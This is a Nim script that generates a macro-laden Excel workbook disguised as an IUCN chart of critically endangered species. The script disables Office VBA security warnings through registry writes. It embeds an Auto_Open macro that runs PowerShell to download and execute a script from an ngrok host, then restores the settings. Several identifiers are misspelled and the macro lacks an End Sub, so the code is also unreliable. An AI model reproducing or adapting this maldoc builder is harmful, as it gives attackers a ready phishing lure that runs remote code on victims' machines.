import winim/com
import strformat
import os


let xlfilename = paramStr(1)
comScript:
    var objExcel = CreateObject("Excel.Application")
    var WshShell = CreateObject("WScript.Shell")
    var Application_Version = objExcel.Version

    var strVBOMRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\AcessVBOM"
    var strVBAWarnRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\VBAWarnings"
    WshShell.RegWrite(strVBOMRegPath, 1, "REG_DWORD")
    WshShell.RegWrite(strVBAWarnRegPath, 1, "REG_DWORD")

    objExcel.visible = false
    objExcel.sheetsInNewWorkBook = 1
    objExcel.dispalyalerts = false

    var objWorkbook = objExcel.workbooks.add()
    var xlmodule = objWorkbook.VBProject.VBComponenets.Add(1)
    var strMacroRevShell = """Sub Auto_Open()
    Call Shell("cmd.exe /c powershell.exe IEX(IWR -uri 'http://0.ngrok.io:443/getit.txt')", 1)
    """
    xlmodule.CodeModule.AddFromString(strMacroRevShell)
    objExcel.activeSheet.name = "Critically Endangered"

    for i, j in ["Mammals", "Birds", "Reptiles", "Fishes", "Plants"]:
        objExcel.activeSheet.cells(1, i + 1) = j # This line needs comScript macro
    
    for cell in objExcel.activeSheet.range("A1:E1"):
        cell.interior.color = RGB(0xee, 0xdd, 0x82)
        cell.interior.pattern = 1
        cell.font.size = 13
        cell.borders.color = RGB(0, 0, 0)
        cell.borders.lineStyle = 1
        cell.borders.weight = 2

    var sheet = objExcel.activeSheet
    sheet.range("A2").value = 184
    sheet.range("B2").value = 182
    sheet.range("C2").value = 57
    sheet.range("D2").value = 162
    sheet.range("E2").value = 1276

    sheet.range("A4:E4").merge()
    sheet.range("A4").value = "Source: IUCN Red List 2003"
    sheet.range("A1:E2").borderAround(1, 2, nil.variant, RGB(0, 0, 0))

    sheet.columns("A1:E2").columnWidth = 12.5

    var xrange = objExcel.activeSheet.range("A1:E2")
    var xchart = objWorkbook.charts.add()
    xchart.chartWizard(xrange, -4100, 7, 1, 1, 0, false, "Critically Endangered Animals and Plants")
    xchart.HashAxis(3) = false
    objWorkbook.SaveAs(xlfilename, FileFormat:=56, Password:="", WriteResPassword:="", ReadOnlyRecommended:=FALSE, CreateBackup:=0, AccessMode:=1, ConflictResolution:=3, AddToMru:=0, TextCodepage:=0, TextVisualLayout:=0, Local:=0)
    WshShell.RegWrite(strVBOMRegPath, 0, REG_DWORD)
    WshShell.RegWrite(strVBAWarnRegPath, 0, REG_DWORD)
    objExcel.DisplayAlerts = false
    objWorkbook.Close(false)
    COM_FullRelease() # Make sure excel.exe will end itself